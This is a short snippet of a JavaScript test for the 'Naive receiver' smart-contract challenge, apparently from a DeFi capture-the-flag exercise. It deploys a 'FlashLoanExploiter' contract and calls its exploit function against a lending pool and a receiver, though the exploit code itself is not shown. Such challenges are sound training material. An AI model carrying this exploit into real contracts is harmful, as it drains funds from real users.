...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Exploit", async function () {
    ...
    const ExploitContractFactory = await ethers.getContractFactory("FlashLoanExploiter", attacker);
    this.exploitContract = await ExploitContractFactory.deploy();

    await this.exploitContract.exploit(this.pool.address, this.receiver.address);
  });
